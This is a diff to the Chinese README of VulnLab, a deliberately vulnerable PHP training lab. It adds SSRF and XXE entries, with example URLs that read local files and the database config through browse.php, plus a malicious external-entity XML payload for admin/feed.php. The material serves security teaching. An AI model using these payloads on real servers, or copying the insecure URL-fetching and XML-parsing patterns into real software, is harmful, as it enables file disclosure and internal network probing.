@@ -31,6 +31,8 @@ VulnLab 模拟了一个包含用户系统和博客功能的典型 PHP 应用，�
 | 垂直越权（未授权访问后台） | A01 Broken Access Control | `admin/*` |
 | CSRF（跨站请求伪造） | A01 Broken Access Control | `admin/delete.php` `comment.php` |
 | 不安全的反序列化 | A08 Software/Data Integrity | `profile.php` `login.php` |
+| SSRF（服务端请求伪造） | A04 Insecure Design | `browse.php` `admin/feed.php` |
+| XXE（XML外部实体注入） | A05 Security Misconfiguration | `admin/feed.php` |
 | 敏感信息泄露（明文密码 / 报错回显） | A02 Cryptographic Failures | 全局 |
 | 失效的身份认证（无频率限制） | A07 Auth Failures | `login.php` |
 
@@ -49,7 +51,8 @@ VulnLab/
 │   ├── users.php           # 用户管理（SQL注入 + 越权）
 │   ├── articles.php        # 文章管理（SQL注入 + 越权）
 │   ├── comments.php        # 评论管理（SQL注入 + 越权）
-│   └── delete.php          # 删除处理器（CSRF + SQL注入）
+│   ├── feed.php            # RSS订阅管理（SSRF + XXE）
+│   └── delete_feed.php     # 删除订阅处理器
 ├── uploads/                # 文件上传目录（需手动创建）
 ├── index.php               # 首页文章列表
 ├── login.php               # 登录（SQL注入 + 暴力破解）
@@ -59,7 +62,8 @@ VulnLab/
 ├── comment.php             # 评论提交（存储型XSS + CSRF）
 ├── search.php              # 搜索（SQL注入 + 反射型XSS）
 ├── profile.php             # 用户中心（水平越权 + 反序列化）
-└── upload.php              # 文件上传（黑名单绕过）
+├── upload.php              # 文件上传（黑名单绕过）
+└── browse.php              # 网页浏览（SSRF）
 ```
 
 ---
@@ -236,6 +240,52 @@ a:3:{s:2:"id";i:2;s:8:"username";s:5:"alice";s:4:"role";i:0;}
 ```
 a:3:{s:2:"id";i:2;s:8:"username";s:5:"alice";s:4:"role";i:1;}
 ```
+
+---
+
+### 7. SSRF（服务端请求伪造）
+
+**网页浏览**（`browse.php`）
+
+直接访问任意 URL，可读取内网服务或本地文件：
+
+```
+# 读取本地文件
+http://localhost/vulnlab/browse.php?url=file:///C:/Windows/win.ini
+
+# 读取数据库配置
+http://localhost/vulnlab/browse.php?url=http://127.0.0.1/vulnlab/conf/db.php
+```
+
+**RSS 订阅**（`admin/feed.php`）
+
+登录后访问 RSS 订阅管理页面，输入恶意 URL，服务器会主动请求：
+
+```
+RSS 地址输入：http://127.0.0.1:3306
+```
+
+---
+
+### 8. XXE（XML外部实体注入）
+
+**RSS 订阅解析**（`admin/feed.php`）
+
+`feed.php` 使用 `LIBXML_NOENT` 解析 XML，未禁用外部实体，攻击者可构造恶意 XML 读取服务器本地文件：
+
+**Step 1** — 构造恶意 XML 文件 `evil.xml`：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+]>
+<rss><channel><title>&xxe;</title></channel></rss>
+```
+
+**Step 2** — 部署恶意 XML 到可访问的位置（如本地 Web 目录），然后在 RSS 订阅管理页面输入该 URL。
+
+**Step 3** — 服务器请求并解析 XML，`&xxe;` 会被替换为文件内容并回显到页面。
 
 ---
 
